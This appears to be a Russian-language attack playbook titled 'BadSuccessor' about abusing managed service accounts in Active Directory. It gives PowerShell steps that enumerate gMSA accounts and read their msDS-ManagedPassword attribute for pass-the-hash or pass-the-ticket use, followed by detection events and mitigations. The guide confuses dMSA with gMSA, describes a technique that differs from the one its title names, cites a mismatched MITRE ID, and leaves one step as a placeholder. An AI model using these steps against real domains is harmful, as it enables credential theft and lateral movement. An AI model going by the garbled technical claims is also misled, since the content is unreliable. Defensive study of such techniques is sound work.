# BadSuccessor — Abuse dMSA для Privilege Escalation в Active Directory

## 🎯 Цель атаки
Эксплуатировать особенности управления учетными записями управляемых служб (dMSA — **Group Managed Service Accounts**) для повышения привилегий в домене Active Directory.

## 📋 Описание
В Active Directory dMSA (Group Managed Service Accounts) позволяют службам и приложениям использовать учетные записи с автоматическим управлением паролями и без необходимости их ввода вручную.  
Уязвимости в контроле прав доступа к атрибутам dMSA (например, msDS-ManagedPassword, msDS-GroupMSAMembership) могут позволить злоумышленнику:
- Извлечь пароль dMSA-аккаунта.
- Использовать его для аутентификации и получения более высоких привилегий.
- Выполнить lateral movement на другие системы.

## ⚠ Условия эксплуатации
- Доступ к объекту dMSA в Active Directory (право чтения атрибутов пароля).
- Возможность выполнения LDAP-запросов к контроллеру домена.
- Отсутствие надлежащих ограничений ACL на объект dMSA.

## 🔹 Пошаговое проведение атаки (лаборатория)
> ⚠ Выполнять только в изолированной тестовой среде!

1. Найти все учетные записи gMSA в домене:
```powershell
Get-ADServiceAccount -Filter *
```
2. Проверить права на доступ к атрибуту `msDS-ManagedPassword`:
```powershell
Get-ADServiceAccount -Identity gmsa01 -Properties msDS-ManagedPassword
```
3. Если есть права, извлечь пароль с помощью PowerShell-модуля:
```powershell
$passwd = (Get-ADServiceAccount -Identity gmsa01 -Properties "msDS-ManagedPassword")."msDS-ManagedPassword"
```
4. Преобразовать пароль в текст и использовать его для подключения по SMB или RDP:
```powershell
# Пример: Pass-the-Hash или Pass-the-Ticket в зависимости от формата
```
5. С полученными правами выполнить действия от имени сервиса (например, доступ к серверу SQL или выполнение задач на сервере приложений).

## 📊 Признаки в логах и мониторинг
- Event ID **4662** — доступ к объектам каталога с атрибутами паролей.
- Аномальная LDAP-активность, направленная на чтение `msDS-ManagedPassword`.
- Логины dMSA-аккаунта с нетипичных хостов.

## 🛡 Меры защиты
- Ограничить права чтения атрибутов `msDS-ManagedPassword` и `msDS-GroupMSAMembership`.
- Использовать принцип наименьших привилегий при назначении сервисных прав.
- Мониторить использование gMSA-аккаунтов и их аутентификацию.
- Регулярно проверять ACL на объекты gMSA в AD.

## 🔗 Источники
- [Microsoft: Group Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- [MITRE ATT&CK: Abuse of Service Accounts](https://attack.mitre.org/techniques/T1136/003/)

---

## 🔍 Разбор команд

### 1. Получение списка всех gMSA
```powershell
Get-ADServiceAccount -Filter *
```
- Выводит список всех учетных записей управляемых служб (gMSA) в домене.

### 2. Проверка прав на доступ к атрибуту пароля
```powershell
Get-ADServiceAccount -Identity gmsa01 -Properties msDS-ManagedPassword
```
- Показывает, есть ли возможность прочитать атрибут `msDS-ManagedPassword` для конкретного gMSA.

### 3. Извлечение пароля
```powershell
$passwd = (Get-ADServiceAccount -Identity gmsa01 -Properties "msDS-ManagedPassword")."msDS-ManagedPassword"
```
- Сохраняет значение атрибута пароля в переменную `$passwd`.

### 4. Использование полученного пароля
- В зависимости от формата (`NTLM hash`, `Kerberos keytab`) можно использовать для Pass-the-Hash, Pass-the-Ticket или прямого входа на сервис.
